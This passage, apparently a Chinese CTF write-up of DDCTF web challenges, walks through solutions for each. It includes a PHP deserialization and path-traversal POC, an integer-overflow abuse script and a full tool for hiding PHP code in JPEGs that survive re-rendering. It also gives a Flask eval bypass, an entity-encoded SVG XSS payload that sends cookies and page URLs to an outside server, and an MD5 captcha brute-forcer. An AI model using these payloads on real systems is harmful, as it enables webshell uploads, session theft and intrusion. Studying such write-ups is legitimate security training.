if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;])){ return FALSE; } if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); } if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) { parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;); return FALSE; } if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) { parent::response(&apos;the user agent not match&apos;,&apos;error&apos;); return FALSE; } return TRUE; } private function session_create() { $sessionid = &apos;&apos;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)), &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;], &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;], &apos;user_data&apos; =&gt; &apos;&apos;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index(); 通读php文件，可以看到获得flag的关键代码在Application.php读取文件这一行， public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;); } exit(); } } 可见，只要控制了path就可以读取任意文件，入手点在session.php文件中，包含了Application.php，所以从session.php入手，可以看到有一行 $session = unserialize($session); 会将我们的session反序列化，如果在session中加入path变量，反序列化调用class类，然后利用析构函数来执行读取文件的操作。 查看session.php，只要function session_read()返回false，代码段，如果session_read()返回false if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &apos;DiDI Welcome you %s&apos;; $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]); parent::response($data,&apos;sucess&apos;); } else{ $this-&gt;session_create(); $data = &apos;DiDI Welcome you&apos;; parent::response($data,&apos;sucess&apos;); } } 就会执行else中的session_create，我们构造的cookie中的session就会被覆盖， if(!isset($session)) { parent::response(&quot;session not found&quot;,&apos;error&apos;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;); return FALSE; } 需要hash等于md5($this-&gt;eancrykey.$session)，自己构造的话，首先需要得到eancrykey，得到eancryket的代码段。 if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); #eancrykey-&gt;EzblrbNS } 我们传入post参数，然后foreach，$V替换掉%s,也就是如果输入nickname=1，输出Welcome my friend 1，但是这样无法读取到eancrykey，第二次foreach，$data就变成Welcome my friend 1，无法获得eancrykey，但是如果第一次传入nickname=%s。第二次foreach的data依然是Welcome my friend %s，获得eancrykey。此时需要使用服务器饭回来的session，不然第一个代码段返回false，无法执行下面的代码。 if(empty($_COOKIE)) { return FALSE; } 获得eancrykey之后就可以绕过$hash !== md5($this-&gt;eancrykey.$session),从而执行 $session = unserialize($session); hash是我们传入的cookie的最后32位，md5($this-&gt;eancrykey.$session)是eancrykey加我们传入的去除掉最后32位cookie，然后在md5，这些都可控，构造使他们相等，最后构造poc，其中代码有一句注释告诉我们flag在哪里。 private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&apos;../config/key.txt&apos;); } 也就是flag在../config/目录下，其中../进行了过滤，../替换为空，双写绕过即可，….//，将../替换为空正好是../ 构造poc: O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525#需要url编码。 大吉大利,今晚吃鸡~这道题目考的相对简单，只有一个点，整数溢出。 利用32位的位限制，2的32位为4294967295，只要超出就会变为33位从而溢出，但是最大32位，最终造成溢出，可以发现，购买的时候我们可以抓包修改价格，可以往高修改，但是无法修改低价格。设置价格为4294967296，正好多出一位，溢出。 此时价格已经发生改变，虽然数值变大了，但是直接支付是可以支付成功的。 此时就正常移除对手就可以，移除100个对手得到flag，写个脚本，注册获得id ticket，不断移除对手即可。 但是一开始移除没有问题，后面发现，同ID好像只能移除一次，所以后期必须不断大量注册，必须写脚本。而生成的ID后期会一直重复，必须大量注册拼凑到100个不同的ID。 接下来是脚本。跑了好一会快一个小时。。 - -。网络不佳。 import requests import time requests.packages.urllib3.disable_warnings() import re urlsss=&quot;http://117.51.147.155:5050/ctf/api/login?name=saddsadsa545&amp;password=saddsadsa545&quot;#这里写需要吃鸡的账号最终接受flag的账号 ss=requests.Session() rr=ss.get(urlsss) for i in range(3500,10000): try: s=requests.Session() register=&quot;http://117.51.147.155:5050//ctf/api/register?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot; url=register%(str(i),str(i)) res=s.get(url) print res.text url=&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297&quot; #login=&quot;http://117.51.147.155:5050/ctf/api/login?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot; #logins=login%(str(i),str(i)) #s=requests.Session() #r=s.get(logins,timeout=3) r=s.get(url) id=&quot;http://117.51.147.155:5050/ctf/api/search_bill_info&quot; r=s.get(id) a=r.text[32:68] pay=&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot; pays=pay%(str(a)) r=s.get(pays) id=r.text[30:34] tick=r.text[48:83] id=id.replace(&quot;:&quot;, &quot;&quot;) id=id.replace(&quot;,&quot;, &quot;&quot;) id=id.replace(&apos;&quot;&apos;, &quot;&quot;) tick=tick.replace(&apos;&quot;&apos;,&quot;&quot;) tick=tick.replace(&apos;}&apos;,&quot;&quot;) tick=tick.replace(&apos;]&apos;,&quot;&quot;) tick=tick.replace(&apos;:&apos;,&quot;&quot;) print id print tick yichu=&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot; result=yichu%(str(id),str(tick)) rr=ss.get(result) print rr.text except Exception as e: pass time.sleep(1) Uoload-IMG这道题考点在图片上传的二次渲染，参考先知的一篇文章，很实用 https://xz.aliyun.com/t/2657 在上传图片马的时候有种检查方式是图片渲染，对于图片一次渲染很容易绕过，只要不破坏图片结构即可，即插入了一句话打开图片，图像并不受任何影响，一般在16进制下在最后加上一句话或者在图片16进制中间空白处加上即可。 本题用到了二次渲染知识，即，上传图片之后，服务器要对图片做第二次渲染，将符合图像的内容留下来。举个例子。 16进制加入phpinfo()代码然后进行上传。 此时服务器已经上传上去我们的图片，下载下来网站上已经上传成功的图片， 发现我们上传的图片中的phpinfo不见了，而且图片中有个特征，gd库渲染，说明是使用了二次渲染，此时就明白了考点，使用二次渲染绕过。 先知社区的文章说明的很清楚包括jpg,gif,png，这里使用jpg来绕过上传。 文件jpg_payload.php &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) { die(&apos;php-gd is not installed&apos;); } if(!isset($argv[1])) { die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&apos;Incorrect SOI marker&apos;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) { die(&apos;Success!&apos;); } else { break; } } } } unlink(&apos;payload_&apos;.$argv[1]); die(&apos;Something\&apos;s wrong&apos;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &apos;&apos;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&apos;File not exists [&apos;.$filename.&apos;]&apos;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&apos;End Of File&apos;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&apos;End Of File&apos;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; 1.首先上传1.jpg到ctf平台上，然后下载经过网站二次渲染后的图片,保存为1.jpg 2.执行命令 php jpg_payload.php 1.jpg 3.将生成的payload_1.jpg上传即可。也可以查看网站二次渲染后的图片可以发现，phpinfo()并没有因二次渲染而去除。 homebrew event loop一道flask python题目，开始以为是flask session伪造。然而并不是-0-！ 点开题目，先智能翻译以下英文。 这道题目是python flask的一道代码审计。给了源代码,不是很熟悉代码的最好在本地复现环境，比较容易理解。 # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = &apos;garzon&apos; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = &apos;*********************&apos; # censored url_prefix = &apos;/d5af33f66147e857&apos; def FLAG(): return &apos;FLAG_is_here_but_i_wont_show_you&apos; # censored def trigger_event(event): session[&apos;log&apos;].append(event) if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; request.event_queue = request.event_queue[1:] if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == &apos;a&apos; action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;) args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;) try: event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = &apos;&apos; resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos; resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;] session[&apos;points&apos;] = request.prev_session[&apos;points&apos;] break except Exception, e: if resp is None: resp = &apos;&apos; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404) session.modified = True return resp @app.route(url_prefix+&apos;/&apos;) def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100: querystring = &apos;action:index;False#False&apos; if &apos;num_items&apos; not in session: session[&apos;num_items&apos;] = 0 session[&apos;points&apos;] = 3 session[&apos;log&apos;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = &apos;&apos; html += &apos;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;]) if page == &apos;index&apos;: html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos; elif page == &apos;shop&apos;: html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos; elif page == &apos;reset&apos;: del session[&apos;num_items&apos;] html += &apos;Session reset.&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == &apos;True&apos;: source = open(&apos;eventLoop.py&apos;, &apos;r&apos;) html = &apos;&apos; if bool_download_source != &apos;True&apos;: html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; for line in source: if bool_download_source != &apos;True&apos;: html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;) else: html += line source.close() if bool_download_source == &apos;True&apos;: headers = {} headers[&apos;Content-Type&apos;] = &apos;text/plain&apos; headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos; return Response(html, headers=headers) else: return html else: trigger_event(&apos;action:view;index&apos;) def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return &apos;invalid number({}) of diamonds to buy&lt;br /&gt;&apos;.format(args[0]) session[&apos;num_items&apos;] += num_items trigger_event([&apos;func:consume_point;{}&apos;.format(num_items), &apos;action:view;index&apos;]) def consume_point_function(args): point_to_consume = int(args[0]) if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException() session[&apos;points&apos;] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return &apos;You naughty boy! ;) &lt;br /&gt;&apos; def get_flag_handler(args): if session[&apos;num_items&apos;] &gt;= 5: trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(&apos;action:view;index&apos;) if __name__ == &apos;__main__&apos;: app.run(debug=False, host=&apos;0.0.0.0&apos;) 不看源码也应该能猜到大概，这道题目大概意思是每个session可以买三次钻石，但是买到五颗才有可能去查看flag，所以首先需要绕过，购买限制，然后进行下一步的可控参数构造函数来执行。 首先从flag函数入手。 def get_flag_handler(args): if session[&apos;num_items&apos;] &gt;= 5: trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(&apos;action:view;index&apos;) 如果session中已经购买的数量大于5，那么调用trigger_event(), def trigger_event(event): session[&apos;log&apos;].append(event) if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) 而最终执行了此flag函数之后并不会直接显示flag，这一句session[‘log’].append(event)会将flag拼接到session中去，flask的session分三部分组成，第一部分就是正常的一些提交数据，第二部分时间戳，然后拼接上签名，第一部分我们是可以直接明文查看的，附上P牛的session脚本。 #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b&apos;.&apos;, 1) payload, timestamp = payload.rsplit(b&apos;.&apos;, 1) decompress = False if payload.startswith(b&apos;.&apos;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&apos;Could not base64 decode the payload because of &apos; &apos;an exception&apos;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&apos;Could not zlib decompress the payload before &apos; &apos;decoding the payload&apos;) return session_json_serializer.loads(payload) if __name__ == &apos;__main__&apos;: print decryption(sys.argv[1].encode()) 首先随便复制一段题目的session来进行解码。 session保存了数据，已经买了两个还有一次购买的机会。还有log，是最后查看flag的时候会拼接进去的数据。 并且log只会保存五条。然后就是如何执行def get_flag_handler(args): 函数了。 在def execute_event_loop(): 函数中有eval函数可以帮助我们执行函数。并且存在拼接，输入的参数将会拼接_handler，然后执行相应的函数。 try: event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) ret_val = event_handler(args) 但是对输入字符有控制， valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) 只能输入限定字符拼接指定的handler或者function，将#url编码，来绕过eval函数的解析，第一次的拼接为trigger_event#_handler，在eval函数里执行则会省略#后的_hander，从而执行trigger_event，通过trigger_event()将flag写进session_log。 但是如果要执行execute_event_loop()里的eval和我们传入的参数，需要def trigger_event(event)里的 if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) 将事件加入队列。从而执行bug，get_flag 最终poc http://116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;30%23action:get_flag;322 因为购买的规则是先购买，购买成功后在判断是否合法，此时get_flag已经执行，所以便可以绕过只能购买三个的限制。 可以看到执行buy,get_flag之后才会判断合法，进而回溯，并不影响获得flag，而在获得flag之后才会执行判断回溯函数，将购买数量重置。 对返回的数据进行解码。 欢迎报名DDCTF由于题目暂时关闭，简单写下此题wp。 进去之后是一个报名页面，前两个框限定了字符20且必填，最后一个框无任何限制，但是未作XSS限制。 听说这里也可以XSS 读取源码，不过我是简单XSS &lt;img src=vpsIP&gt; 请求头里带了一个提示，http://139.199.107.193/hint.php 发表文章之后会给你文章的链接，开始还不知道有什么用。 发现反馈页面，这就很清楚了发表文章，然后给服务器来查看，导致XSS， XSS绕过不多说了，可以参考我的XSS小结里的svg黑魔法。 &lt;svg&gt;&lt;script&gt; &amp;#118;&amp;#97;&amp;#114;&amp;#32;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#52;&amp;#55;&amp;#46;&amp;#49;&amp;#48;&amp;#54;&amp;#46;&amp;#49;&amp;#56;&amp;#53;&amp;#46;&amp;#54;&amp;#57;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#105;&amp;#110;&amp;#100;&amp;#101;&amp;#120;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#59; &amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#40;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#73;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&amp;#40;&amp;#41;&amp;#41;&amp;#46;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#43;&amp;#39;&amp;#47;&amp;#63;&amp;#107;&amp;#101;&amp;#101;&amp;#112;&amp;#115;&amp;#101;&amp;#115;&amp;#115;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#49;&amp;#38;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#116;&amp;#111;&amp;#112;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#116;&amp;#111;&amp;#112;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#40;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#38;&amp;#38;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#41;&amp;#63;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#58;&amp;#39;&amp;#39;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#59;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#59; &lt;/script&gt; 加载XSS脚本，简单提一下，在svg标签里的所有实体化编码都可以被解析还原，因为这里投稿过滤了单引号双引号等于号括号，能过滤的都过滤了。 验证码脚本。 # -*- coding: utf-8 -*- import hashlib from multiprocessing.dummy import Pool as ThreadPool # MD5截断数值已知 求原始数据 # 例子 substr(md5(captcha), 0, 6)=60b7ef def md5(s): # 计算MD5字符串 return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest() keymd5 = &apos;5ffe8d&apos; #已知的md5截断值 md5start = 0 # 设置题目已知的截断位置 md5length = 6 def findmd5(sss): # 输入范围 里面会进行md5测试 key = sss.split(&apos;:&apos;) start = int(key[0]) # 开始位置 end = int(key[1]) # 结束位置 result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:6] == keymd5: # 拿到加密字符串 result = i print(result) # 打印 break list=[] # 参数列表 for i in range(10): # 多线程的数字列表 开始与结尾 list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1))) pool = ThreadPool() # 多线程任务 pool.map(findmd5, list) # 函数 与参数列表 pool.close() pool.join() 然后可以打到cookie执行所有的js脚本 http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php 的页面显示没有登陆，应该是需要管理员查看此页面，读取admin.php源码得到新的做题目录。 http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id= 宽字节注入。获得flag。 mysql弱口令这道题考的知识点比较神仙操作。 